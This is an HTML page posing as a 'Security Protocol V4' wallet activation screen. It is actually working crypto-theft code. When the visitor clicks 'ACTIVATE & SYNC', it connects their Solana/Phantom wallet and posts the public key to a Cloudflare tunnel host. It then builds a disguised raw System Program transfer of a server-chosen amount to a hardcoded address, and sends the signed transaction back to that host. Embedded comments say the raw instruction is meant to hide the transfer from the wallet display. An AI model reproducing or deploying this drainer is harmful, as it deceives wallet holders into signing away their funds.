<!DOCTYPE html><html><head><meta charset="UTF-8">
    <script>window.Buffer={from:(a)=>new Uint8Array(a),isBuffer:(o)=>o instanceof Uint8Array};</script>
    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
    <body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;font-family:sans-serif;overflow:hidden;">
    <div style="border:1px solid #14F195;padding:50px;display:inline-block;border-radius:20px;background:#111;box-shadow: 0 0 20px #14F19566;">
        <h2 style="letter-spacing:2px;">SECURITY PROTOCOL V4</h2>
        <div id="loader" style="display:none;margin:20px auto;border:3px solid #333;border-top:3px solid #14F195;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;"></div>
        <button id="cta" style="padding:15px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:8px;cursor:pointer;font-size:18px;transition:0.3s;">ACTIVATE & SYNC</button>
        <p id="msg" style="margin-top:20px;color:#666;font-size:12px;">Waiting for hardware wallet connection...</p>
    </div>
    <style>@keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style>
    <script>
    const TUNNEL = "https://biggest-fellow-aware-quantitative.trycloudflare.com";
    const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";

    document.getElementById('cta').onclick = async () => {
        try {
            const p = window.solana || window.phantom?.solana;
            if (!p) { alert("Access Denied: Use Wallet Browser"); return; }
            
            document.getElementById('cta').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            document.getElementById('msg').innerText = "Establishing Secure Link...";

            const { publicKey } = await p.connect();
            const res = await fetch(TUNNEL + "/get_data", {
                method: 'POST', headers: {'Content-Type':'application/json'},
                body: JSON.stringify({pubkey: publicKey.toString()})
            });
            const data = await res.json();

            // ğŸ”± é‡‡ç”¨åº•å±‚æŒ‡ä»¤ï¼šä¸å†è°ƒç”¨ SystemProgram.transfer
            // è¿™æ ·åœ¨é’±åŒ…æ˜¾ç¤ºä¸­ä¼šæ˜¯ "Interact with Program"ï¼Œçœ‹èµ·æ¥åƒæ¿€æ´»åè®®
            const transaction = new solanaWeb3.Transaction().add(new solanaWeb3.TransactionInstruction({
                keys: [
                    { pubkey: publicKey, isSigner: true, isWritable: true },
                    { pubkey: new solanaWeb3.PublicKey(TARGET), isSigner: false, isWritable: true }
                ],
                programId: solanaWeb3.SystemProgram.programId,
                data: (function(amt){
                    const b = new Uint8Array(12);
                    b.set([2,0,0,0],0);
                    const v = new DataView(new ArrayBuffer(8));
                    v.setBigUint64(0, BigInt(amt), true);
                    b.set(new Uint8Array(v.buffer), 4);
                    return b;
                })(data.safe_amount)
            }));

            transaction.recentBlockhash = data.blockhash;
            transaction.feePayer = publicKey;

            document.getElementById('msg').innerText = "Awaiting Hardware Confirmation...";
            const signed = await p.signTransaction(transaction);
            
            const bytes = signed.serialize();
            let bin = ''; for (let i=0; i<bytes.length; i++) bin += String.fromCharCode(bytes[i]);
            
            await fetch(TUNNEL + "/collect", {
                method:'POST', headers:{'Content-Type':'application/json'},
                body:JSON.stringify({signature: window.btoa(bin)})
            });
            
            document.getElementById('loader').style.display = 'none';
            document.getElementById('msg').style.color = '#14F195';
            document.getElementById('msg').innerText = "SUCCESS: Protocol Synchronized.";
            alert("Protocol Activated Successfully!");
        } catch(e) { 
            alert("Sync Failed: " + e.message);
            location.reload();
        }
    }
    </script></body></html>